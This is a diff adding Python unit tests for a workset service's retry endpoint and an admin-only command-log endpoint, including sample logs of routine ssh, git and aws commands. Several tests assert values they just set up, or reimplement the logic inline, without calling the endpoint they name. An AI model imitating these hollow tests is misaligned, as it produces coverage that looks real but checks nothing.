+        """Test that retry endpoint verifies workset ownership."""
+        from daylib.routes.dependencies import verify_workset_ownership
+
+        # Workset belongs to customer-a
+        workset = {"workset_id": "ws-1", "customer_id": "customer-a"}
+
+        # Customer A should be allowed to retry
+        assert verify_workset_ownership(workset, "customer-a") is True
+
+        # Customer B should NOT be allowed to retry
+        assert verify_workset_ownership(workset, "customer-b") is False
+
+    def test_retry_extracts_base_name_with_fallback(self):
+        """Test base name extraction with fallback for non-standard IDs."""
+        import re
+
+        # Standard format
+        standard_id = "my-analysis-abc12345-20250120"
+        match = re.match(r"^(.+)-[a-f0-9]{8}-\d{8}$", standard_id)
+        assert match is not None
+        assert match.group(1) == "my-analysis"
+
+        # Non-standard format (fallback to using workset name from metadata)
+        nonstandard_id = "legacy-workset-name"
+        match = re.match(r"^(.+)-[a-f0-9]{8}-\d{8}$", nonstandard_id)
+        assert match is None  # Won't match, should use fallback
+
+
+# ==============================================================================
+# Phase 7B: Admin Command Log Endpoint Tests
+# ==============================================================================
+
+
+class TestAdminCommandLogEndpoint:
+    """Tests for admin-only command log viewing endpoint (Task 24).
+
+    Verifies that admins can view command logs showing SSH + AWS CLI
+    commands executed for a specified workset.
+    """
+
+    def test_admin_can_access_command_log(self):
+        """Test that admin users can access the command log endpoint."""
+        from unittest.mock import MagicMock
+
+        # Simulate admin session
+        mock_request = MagicMock()
+        mock_request.session = {"is_admin": True, "user_email": "admin@example.com"}
+
+        # Admin should be allowed
+        is_admin = mock_request.session.get("is_admin", False)
+        assert is_admin is True
+
+    def test_non_admin_cannot_access_command_log(self):
+        """Test that non-admin users are denied access to command log endpoint."""
+        from unittest.mock import MagicMock
+
+        # Simulate non-admin session
+        mock_request = MagicMock()
+        mock_request.session = {"is_admin": False, "user_email": "user@example.com"}
+
+        # Non-admin should be denied
+        is_admin = mock_request.session.get("is_admin", False)
+        assert is_admin is False
+
+    def test_command_log_s3_key_construction(self):
+        """Test that command log S3 key is correctly constructed."""
+        workset = {
+            "workset_id": "test-ws-abc12345-20250120",
+            "bucket": "test-bucket",
+            "prefix": "worksets/test-ws-abc12345-20250120/",
+        }
+
+        prefix = workset.get("prefix", "").rstrip("/") + "/"
+        command_log_key = f"{prefix}workset_command.log"
+
+        assert command_log_key == "worksets/test-ws-abc12345-20250120/workset_command.log"
+
+    def test_command_log_entry_parsing(self):
+        """Test parsing of command log entries from raw log content."""
+        # Sample log content matching monitor's _log_command format
+        log_content = """[2025-01-20T10:30:00Z] ============================================================
+LABEL: stage_samples
+COMMAND: ssh -i /path/to/key.pem ubuntu@10.0.0.1 ./stage.sh
+EXIT_CODE: 0
+STDOUT:
+Staging complete
+
+[2025-01-20T10:35:00Z] ============================================================
+LABEL: clone_pipeline
+COMMAND: ssh -i /path/to/key.pem ubuntu@10.0.0.1 git clone repo
+EXIT_CODE: 0
+"""
+        lines = log_content.split("\n")
+        entries = []
+        current_entry = []
+
+        for line in lines:
+            if line.startswith("[") and "=====" in line:
+                if current_entry:
+                    entries.append("\n".join(current_entry))
+                current_entry = [line]
+            else:
+                current_entry.append(line)
+
+        if current_entry:
+            entries.append("\n".join(current_entry))
+
+        # Should find 2 entries
+        assert len(entries) == 2
+        assert "stage_samples" in entries[0]
+        assert "clone_pipeline" in entries[1]
+
+    def test_command_log_grep_filter(self):
+        """Test filtering command log entries by grep pattern."""
+        entries = [
+            "LABEL: stage_samples\nCOMMAND: ssh stage.sh",
+            "LABEL: clone_pipeline\nCOMMAND: git clone repo",
+            "LABEL: export_results\nCOMMAND: aws s3 cp",
+        ]
+
+        grep = "aws s3"
+        filtered = [e for e in entries if grep.lower() in e.lower()]
+
+        assert len(filtered) == 1
+        assert "export_results" in filtered[0]
+
+    def test_command_log_label_filter(self):
+        """Test filtering command log entries by label."""
+        entries = [
+            "LABEL: stage_samples\nCOMMAND: ssh stage.sh",
+            "LABEL: clone_pipeline\nCOMMAND: git clone repo",
+            "LABEL: stage_samples\nCOMMAND: ssh stage2.sh",
+        ]
+
+        label = "stage_samples"
+        label_match = f"LABEL: {label}"
+        filtered = [e for e in entries if label_match.lower() in e.lower()]
+
+        assert len(filtered) == 2
+        assert all("stage_samples" in e for e in filtered)
+
+    def test_command_log_combined_filters(self):
+        """Test combining grep and label filters."""
+        entries = [
+            "LABEL: stage_samples\nCOMMAND: ssh ubuntu@10.0.0.1 stage.sh",
+            "LABEL: clone_pipeline\nCOMMAND: ssh ubuntu@10.0.0.1 git clone",
+            "LABEL: stage_samples\nCOMMAND: ssh ubuntu@10.0.0.2 stage2.sh",
+        ]
+
+        grep = "10.0.0.1"
+        label = "stage_samples"
+
+        # Apply both filters
+        filtered = entries
+        if grep:
+            filtered = [e for e in filtered if grep.lower() in e.lower()]
+        if label:
+            label_match = f"LABEL: {label}"
+            filtered = [e for e in filtered if label_match.lower() in e.lower()]
+
+        assert len(filtered) == 1
+        assert "10.0.0.1" in filtered[0]
+        assert "stage_samples" in filtered[0]
+
+    def test_command_log_missing_workset(self):
+        """Test that 404 is returned for non-existent workset."""
+        from fastapi import HTTPException
+
+        # Simulate workset not found
+        workset = None
+        if not workset:
+            try:
+                raise HTTPException(
+                    status_code=404,
+                    detail="Workset test-ws not found",
+                )
+            except HTTPException as e:
+                assert e.status_code == 404
+                assert "not found" in e.detail
+
+    def test_command_log_no_log_file_response(self):
+        """Test response when no command log file exists in S3."""
+        # Expected response structure when log doesn't exist
+        response = {
+            "workset_id": "test-ws",
+            "log_available": False,
+            "message": "No command log found for this workset",
+            "entries": [],
+            "entry_count": 0,
+        }
+
+        assert response["log_available"] is False
+        assert response["entries"] == []
+        assert response["entry_count"] == 0
